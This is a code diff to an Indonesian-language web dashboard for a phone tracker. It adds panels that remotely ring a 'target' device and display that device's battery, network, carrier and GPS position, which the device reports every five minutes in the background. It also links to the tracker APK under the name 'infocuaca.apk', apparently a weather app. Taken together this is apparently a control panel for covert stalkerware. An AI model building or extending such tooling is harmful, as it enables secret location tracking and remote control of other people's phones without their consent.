@@ -609,6 +609,65 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
     <div><span class="k">PATH FIREBASE</span><span class="v" id="lampPathTxt" style="font-size:9px">-</span></div>
   </div>
 </div>
+<style>
+.dev-row{font-size:10.5px;line-height:2;border-bottom:1px dashed #16202f;padding-bottom:2px}
+.dev-row:last-child{border-bottom:none}
+.dev-k{color:var(--text-d);display:inline-block;min-width:118px}
+.dev-v{color:var(--cyan);word-break:break-word}
+.stat-grid{display:flex;gap:14px;flex-wrap:wrap}
+.stat-col{flex:1;min-width:170px}
+.stat-num{font-size:20px;letter-spacing:1px}
+</style>
+<div class="term-body" id="cariPanel">
+  <div class="prompt">[Cari HP] Bunyikan Perangkat Target</div>
+  <div style="font-size:10px;color:var(--text-d);margin-bottom:10px">&rsaquo; HP target akan BERBUNYI NYARING &amp; BERGETAR 45 detik &mdash; tetap jalan walau aplikasi sudah ditutup atau HP mode senyap:</div>
+  <div class="lamp-ctrl">
+    <button class="term-btn" id="cariBtn" onclick="cariHp()">&#128276; CARI HP</button>
+    <button class="term-btn outline" onclick="cariStop()">&#9632; STOP</button>
+  </div>
+  <div class="lamp-id-row">
+    <input class="geo-inp" id="cariUid" placeholder="ID device target (= user APK tracker)" autocomplete="off">
+    <button class="term-btn outline" onclick="cariSetUid()" style="margin:0;flex:0 0 auto;width:auto;padding:0 14px">SET</button>
+  </div>
+  <div style="margin-top:10px">
+    <div class="dev-row"><span class="dev-k">STATUS</span><span class="dev-v" id="cariState">-</span></div>
+    <div class="dev-row"><span class="dev-k">WAKTU</span><span class="dev-v" id="cariTime">-</span></div>
+    <div class="dev-row"><span class="dev-k">DEVICE</span><span class="dev-v" id="cariDevice">-</span></div>
+    <div class="dev-row"><span class="dev-k">PATH</span><span class="dev-v" id="cariPath" style="font-size:9px">-</span></div>
+  </div>
+</div>
+<div class="term-body" id="statPanel">
+  <div class="prompt">[Status HP] Baterai &amp; Jaringan Perangkat</div>
+  <div style="font-size:10px;color:var(--text-d);margin-bottom:10px">&rsaquo; dikirim otomatis tiap 5 menit &mdash; tanpa perlu aplikasi dibuka:</div>
+  <div class="stat-grid">
+    <div class="stat-col">
+      <div class="dev-row"><span class="dev-k">BATERAI</span><span class="dev-v stat-num" id="stBaterai">-</span></div>
+      <div class="dev-row"><span class="dev-k">MENGISI</span><span class="dev-v" id="stMengisi">-</span></div>
+      <div class="dev-row"><span class="dev-k">SUHU</span><span class="dev-v" id="stSuhu">-</span></div>
+      <div class="dev-row"><span class="dev-k">BUNYI</span><span class="dev-v" id="stBunyi">-</span></div>
+    </div>
+    <div class="stat-col">
+      <div class="dev-row"><span class="dev-k">JARINGAN</span><span class="dev-v" id="stJaringan">-</span></div>
+      <div class="dev-row"><span class="dev-k">WIFI</span><span class="dev-v" id="stWifi">-</span></div>
+      <div class="dev-row"><span class="dev-k">OPERATOR</span><span class="dev-v" id="stOperator">-</span></div>
+      <div class="dev-row"><span class="dev-k">POSISI</span><span class="dev-v" id="stPosisi">-</span></div>
+    </div>
+  </div>
+  <div style="margin-top:8px">
+    <div class="dev-row"><span class="dev-k">HP</span><span class="dev-v" id="stHp">-</span></div>
+    <div class="dev-row"><span class="dev-k">DIPERBARUI</span><span class="dev-v" id="stWaktu">-</span></div>
+    <div class="dev-row"><span class="dev-k">PATH</span><span class="dev-v" id="stPath" style="font-size:9px">-</span></div>
+  </div>
+  <div style="margin-top:10px">
+    <button class="term-btn outline" onclick="cepHpTarget()" style="width:auto;padding:0 14px">&#129658; CEK HP TARGET</button>
+    <span style="font-size:9.5px;color:var(--text-d);margin-left:8px">&rsaquo; baca laporan uji dari HP (perlu blok 8 di APK)</span>
+  </div>
+  <div id="camUjiBox" style="display:none;margin-top:10px;border:1px solid var(--border);border-radius:var(--radius);background:#050a13;padding:8px 10px">
+    <div style="font-size:9.5px;letter-spacing:1px;color:var(--text-d);margin-bottom:5px">HASIL UJI SENDIRI DARI HP TARGET</div>
+    <pre id="camUjiIsi" style="margin:0;font-family:monospace;font-size:9.5px;line-height:1.7;white-space:pre-wrap;word-break:break-word;color:var(--cyan);max-height:210px;overflow:auto">-</pre>
+    <button class="term-btn outline" onclick="salinUji()" style="margin-top:8px;width:auto;padding:0 12px;font-size:9.5px">&#128203; SALIN LAPORAN</button>
+  </div>
+</div>
 <div class="term-body"><div class="prompt">[Tools] Install Tracker APK</div><div class="term-info"><div><span class="k">FUNCTION</span><span class="v">Lacak HP kamu</span></div><div><span class="k">INTERVAL</span><span class="v">5 menit auto</span></div><div><span class="k">MODE</span><span class="v">Background service</span></div></div><div class="apk-steps"><div>Download file</div><div>Install APK</div><div>Input ID</div><div>Tracking aktif</div></div><a href="https://github.com/roraxbali/official/raw/main/infocuaca.apk" target="_blank" style="text-decoration:none"><button class="term-btn" style="margin-top:6px">Download APK</button></a></div>
 <div class="term-body" id="toolsPanel">
   <div class="prompt">[Tools] Utility Panel</div>
@@ -1219,8 +1278,11 @@ window.copyLink=async()=>{
   if(!link)return;
   try{
     await navigator.clipboard.writeText(link);
-    document.getElementById('btnCopy').innerText='✓ Tersalin';
-    setTimeout(()=>document.getElementById('btnCopy').innerText='📋 Salin Link',2000);
+    var _bc=document.getElementById('btnCopy');   /* FIX: dulu bisa error kalau tombolnya tidak ada */
+    if(_bc){
+      _bc.innerText='✓ Tersalin';
+      setTimeout(function(){ _bc.innerText='📋 Salin Link'; },2000);
+    }
     if(window.clipAdd)clipAdd(link,window.currentShortLink?'SHORT':'LONG');
   }catch(e){}
 };
@@ -1651,5 +1713,263 @@ window.lampuCmd = function(state){
   console.log('%c[LAMP] Remote lampu aktif — path: kontrol/<uid>/lampu', 'color:#ffd76a;font-weight:bold');
 })();
 </script>
-<script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a3ea5191e937c539',t:'MTc5MDAwNjgwMg=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+<script>
+/* ===== [DIAGNOSA] Lihat laporan UJI SENDIRI dari HP target =====
+   Membaca: kontrol/<uid>/uji   (ditulis oleh blok 8-BLOK-UJI-SENDIRI di APK)
+================================================================ */
+window.cepHpTarget = function(){
+  if(window.playKlik) playKlik();
+  if(!CAM.uid){ alert('Isi ID device target dulu, lalu tekan SET.'); return; }
+  var kotak = document.getElementById('camUjiBox');
+  var isi   = document.getElementById('camUjiIsi');
+  if(kotak) kotak.style.display = 'block';
+  if(isi)   isi.innerText = 'Membaca laporan dari HP target...';
+  if(window.addLog) addLog('\U0001fa7a Membaca laporan uji dari ' + CAM.uid + ' ...', 'info');
+  var un = null, selesai = false;
+  function tampil(d){
+    if(selesai) return; selesai = true;
+    try { if(un) un(); } catch(e){}
+    if(!d){
+      if(isi) isi.innerText = '- belum ada laporan -\n\nCara membuat laporan:\n1. Tempel file 8-BLOK-UJI-SENDIRI.java di onCreate\n2. Build APK lalu buka aplikasi di HP target\n3. Diamkan 15 detik, lalu tekan CEK HP lagi';
+      if(window.addLog) addLog('\U0001fa7a Belum ada laporan uji dari HP target (blok 8 belum dipasang / belum dijalankan)', 'warn');
+      return;
+    }
+    function b(v){ return (v === undefined || v === null || v === '') ? '-' : String(v); }
+    var baris = [
+      ['HP target',          b(d.hp) + '  (Android ' + b(d.android) + ')'],
+      ['ID device',          b(d.uid)],
+      ['Izin',               'lokasi: ' + b(d.izin_lokasi) + ' | notif: ' + b(d.izin_notif)],
+      ['Lokasi latar',       b(d.izin_latar)],
+      ['Bebas baterai',      b(d.bebas_baterai)],
+      ['Lampu kilat HP',     b(d.flash_hp) + ' | per kamera: ' + b(d.lampu_kilat)],
+      ['Senter cara 1',      b(d.cara1_cameraManager)],
+      ['Senter cara 2',      b(d.cara2_kamera1)],
+            ['Service lokasi',     b(d.service)],
+      ['Perintah lampu',     b(d.target_lampu)],
+      ['Baca Firebase',      b(d.baca_firebase)],
+      ['Waktu laporan',      d.waktu ? new Date(d.waktu).toLocaleString('id-ID') : '-']
+    ];
+    var teks = baris.map(function(r){
+      var nama = r[0];
+      while(nama.length < 22) nama += ' ';
+      return nama + ': ' + r[1];
+    }).join('\n');
+    if(isi) isi.innerText = teks;
+    baris.forEach(function(r){
+      var v = r[1] || '';
+      var tingkat = /GAGAL|BELUM|TIDAK/i.test(v) ? 'err' : (/belum|tidak tahu|\?/i.test(v) ? 'warn' : 'ok');
+      if(window.addLog) addLog('\U0001fa7a ' + r[0] + ': ' + v, tingkat);
+    });
+  }
+  try{
+    un = window.onValue(window.ref(window.db, 'kontrol/' + CAM.uid + '/uji'),
+      function(snap){ tampil(snap.val()); },
+      function(err){ tampil(undefined); if(window.addLog) addLog('\u2717 Gagal baca laporan: ' + ((err && err.message) ? err.message : err), 'err'); });
+  } catch(e){
+    tampil(undefined);
+    if(window.addLog) addLog('\u2717 Error: ' + e.message, 'err');
+  }
+  setTimeout(function(){ if(!selesai){ tampil(undefined); } }, 8000);
+};
+
+window.salinUji = function(){
+  var isi = document.getElementById('camUjiIsi');
+  var teks = isi ? isi.innerText : '';
+  if(!teks || teks.charAt(0) === '-'){ alert('Belum ada laporan untuk disalin.'); return; }
+  if(window.playKlik) playKlik();
+  function berhasil(){ if(window.addLog) addLog('\U0001f4cb Laporan disalin - tinggal tempel ke chat', 'ok'); }
+  try{
+    if(navigator.clipboard && navigator.clipboard.writeText){
+      navigator.clipboard.writeText(teks).then(berhasil, function(){ caraLama(); });
+    } else { caraLama(); }
+  } catch(e){ caraLama(); }
+  function caraLama(){
+    try{
+      var ta = document.createElement('textarea');
+      ta.value = teks;
+      ta.style.position = 'fixed'; ta.style.opacity = '0';
+      document.body.appendChild(ta); ta.select();
+      document.execCommand('copy');
+      document.body.removeChild(ta);
+      berhasil();
+    } catch(e){ alert('Gagal menyalin. Salin manual dari kotak hasil uji.'); }
+  }
+};
+</script>
+<script>
+/* ===== [DEVICE] Cari HP + Status HP =====
+   Cari HP   : dashboard tulis  kontrol/<uid>/cari      { cmd:'cari' | 'stop', t, by }
+               HP (service) baca -> berbunyi + bergetar -> tulis state:'berbunyi' | 'diam'
+   Status HP : HP tulis  kontrol/<uid>/perangkat  { baterai, suhu, jaringan, wifi, operator, ... }
+================================================================ */
+var DEVME = localStorage.getItem('username') || '';
+var CAM = window.CAM || { uid: localStorage.getItem('devUid_' + DEVME) || DEVME };
+function camEl(id){ return document.getElementById(id); }
+
+function devUmur(ms){
+  if(!ms) return '-';
+  var s = Math.floor((Date.now() - ms) / 1000);
+  if(s < 0) s = 0;
+  if(s < 5) return 'baru saja';
+  if(s < 60) return s + ' detik lalu';
+  if(s < 3600) return Math.floor(s / 60) + ' menit lalu';
+  return new Date(ms).toLocaleString('id-ID');
+}
+function devWaktu(ms){ return ms ? (new Date(ms).toLocaleString('id-ID') + ' \u00b7 ' + devUmur(ms)) : '-'; }
+
+/* ---------- CARI HP ---------- */
+var CARI = { unsub:null, wait:0, data:null };
+
+function cariRender(d){
+  if(d !== undefined) CARI.data = d;
+  var dd = CARI.data || {};
+  var state = dd.state || null;
+  var menunggu = CARI.wait > 0 && (!dd.updated || dd.updated < (CARI.wait - 1500));
+  var t = camEl('cariState');
+  if(!t) return;
+  var teks;
+  if(menunggu) teks = 'MENUNGGU HP...';
+  else if(state === 'berbunyi') teks = 'SEDANG BERBUNYI';
+  else if(state === 'diam') teks = 'DIAM / SIAP';
+  else teks = 'SIAP';
+  t.innerText = teks;
+  t.style.color = (state === 'berbunyi') ? 'var(--green)'
+                : (menunggu ? 'var(--amber)' : 'var(--cyan)');
+  camEl('cariTime').innerText = devWaktu(dd.updated);
+  camEl('cariDevice').innerText = dd.device || '-';
+  camEl('cariPath').innerText = 'kontrol/' + CAM.uid + '/cari';
+  var b = camEl('cariBtn');
+  if(b) b.classList.toggle('sel', state === 'berbunyi');
+}
+
+function cariSubscribe(){
+  var p = camEl('cariPath');
+  if(p) p.innerText = 'kontrol/' + CAM.uid + '/cari';
+  if(CARI.unsub){ try{ CARI.unsub(); }catch(e){} CARI.unsub = null; }
+  var coba = 0;
+  var t = setInterval(function(){
+    coba++;
+    if(window.onValue && window.ref && window.db){
+      clearInterval(t);
+      try{
+        CARI.unsub = window.onValue(
+          window.ref(window.db, 'kontrol/' + CAM.uid + '/cari'),
+          function(snap){ cariRender(snap.val()); },
+          function(err){ var e = camEl('cariState'); if(e) e.innerText = 'Gagal baca: ' + ((err && err.message) ? err.message : err); }
+        );
+      }catch(e){ var e2 = camEl('cariState'); if(e2) e2.innerText = 'Error: ' + e.message; }
+    } else if(coba > 60){
+      clearInterval(t);
+      var e3 = camEl('cariState'); if(e3) e3.innerText = 'Firebase belum siap - refresh halaman';
+    }
+  }, 500);
+}
+
+window.cariSetUid = function(){
+  var inp = camEl('cariUid');
+  var v = inp ? (inp.value || '').trim() : '';
+  if(!v){ alert('Isi ID device target dulu (sama dengan ID di APK).'); return; }
+  CAM.uid = v;
+  try{ localStorage.setItem('devUid_' + DEVME, v); }catch(e){}
+  if(window.playKlik) playKlik();
+  if(window.addLog) addLog('\uD83D\uDD14 Panel Cari HP diarahkan ke: ' + v, 'ok');
+  CARI.wait = 0; CARI.data = null;
+  cariRender({}); statRender({});
+  cariSubscribe(); statSubscribe();
+};
+
+function cariKirim(cmd){
+  if(window.playKlik) playKlik();
+  if(!CAM.uid){ alert('ID device belum diset.'); return; }
+  if(!(window.ref && window.db && window.update)){
+    alert('Firebase belum siap. Tunggu 1-2 detik lalu tekan lagi.');
+    return;
+  }
+  CARI.wait = (cmd === 'cari') ? Date.now() : 0;
+  window.update(window.ref(window.db, 'kontrol/' + CAM.uid + '/cari'),
+    { cmd: cmd, t: Date.now(), by: (DEVME || 'dashboard') })
+    .then(function(){
+      if(cmd === 'cari'){
+        if(window.beep) beep(1500, 0.08);
+        if(window.addLog) addLog('\uD83D\uDD14 Perintah CARI HP dikirim ke ' + CAM.uid, 'ok');
+        if(window.actLog) actLog('\uD83D\uDD14 Cari HP: ' + CAM.uid, 'info');
+      } else {
+        if(window.addLog) addLog('\u2713 Perintah STOP dikirim ke ' + CAM.uid, 'warn');
+      }
+      cariRender();
+      setTimeout(function(){ cariRender(); }, 5000);
+    })
+    .catch(function(e){
+      CARI.wait = 0;
+      alert('Gagal kirim perintah: ' + e.message);
+      if(window.addLog) addLog('\u2717 Gagal kirim: ' + e.message, 'err');
+    });
+}
+window.cariHp = function(){ cariKirim('cari'); };
+window.cariStop = function(){ cariKirim('stop'); };
+
+/* ---------- STATUS HP ---------- */
+var STAT = { unsub:null, data:null };
+
+function statRender(d){
+  if(d !== undefined) STAT.data = d;
+  var dd = STAT.data || {};
+  function b(v){ return (v === undefined || v === null || v === '') ? '-' : String(v); }
+  var el = function(id){ return camEl(id); };
+  if(!el('stBaterai')) return;
+  var bat = (typeof dd.baterai === 'number' && dd.baterai >= 0) ? (dd.baterai + '%') : '-';
+  el('stBaterai').innerText = bat;
+  el('stBaterai').style.color = (typeof dd.baterai === 'number' && dd.baterai >= 0 && dd.baterai < 20)
+      ? 'var(--red)' : 'var(--cyan)';
+  el('stMengisi').innerText = dd.mengisi ? 'YA (sedang di-charge)' : 'tidak';
+  el('stSuhu').innerText = (typeof dd.suhu === 'number' && dd.suhu > 0) ? (dd.suhu.toFixed(1) + ' \u00b0C') : '-';
+  el('stBunyi').innerText = b(dd.bunyi);
+  el('stBunyi').style.color = (dd.bunyi === 'berbunyi') ? 'var(--green)' : 'var(--cyan)';
+  el('stJaringan').innerText = b(dd.jaringan);
+  el('stWifi').innerText = b(dd.wifi);
+  el('stOperator').innerText = b(dd.operator);
+  var pos = '-';
+  if(typeof dd.lat === 'number' && typeof dd.lng === 'number' && dd.lat !== 0 && dd.lng !== 0){
+    pos = dd.lat.toFixed(5) + ', ' + dd.lng.toFixed(5);
+    if(typeof dd.akurasi === 'number' && dd.akurasi > 0) pos += ' (\u00b1' + Math.round(dd.akurasi) + ' m)';
+  }
+  el('stPosisi').innerText = pos;
+  el('stHp').innerText = b(dd.hp) + (dd.android ? ' \u00b7 Android ' + dd.android : '');
+  el('stWaktu').innerText = devWaktu(dd.updated);
+  el('stPath').innerText = 'kontrol/' + CAM.uid + '/perangkat';
+}
+
+function statSubscribe(){
+  var p = camEl('stPath');
+  if(p) p.innerText = 'kontrol/' + CAM.uid + '/perangkat';
+  if(STAT.unsub){ try{ STAT.unsub(); }catch(e){} STAT.unsub = null; }
+  var coba = 0;
+  var t = setInterval(function(){
+    coba++;
+    if(window.onValue && window.ref && window.db){
+      clearInterval(t);
+      try{
+        STAT.unsub = window.onValue(
+          window.ref(window.db, 'kontrol/' + CAM.uid + '/perangkat'),
+          function(snap){ statRender(snap.val()); },
+          function(err){ var e = camEl('stWaktu'); if(e) e.innerText = 'Gagal baca: ' + ((err && err.message) ? err.message : err); }
+        );
+      }catch(e){ var e2 = camEl('stWaktu'); if(e2) e2.innerText = 'Error: ' + e.message; }
+    } else if(coba > 60){
+      clearInterval(t);
+      var e3 = camEl('stWaktu'); if(e3) e3.innerText = 'Firebase belum siap - refresh halaman';
+    }
+  }, 500);
+}
+
+(function devInit(){
+  var i1 = camEl('cariUid'); if(i1) i1.value = CAM.uid;
+  cariRender({}); statRender({});
+  cariSubscribe(); statSubscribe();
+  setInterval(function(){ cariRender(); statRender(); }, 5000);
+  console.log('%c[DEVICE] Panel Cari HP & Status HP aktif', 'color:#38bdf8;font-weight:bold');
+})();
+</script>
+
+<script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a3edf646e834ca81',t:'MTc5MDA0NTAwNQ=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
 </html>
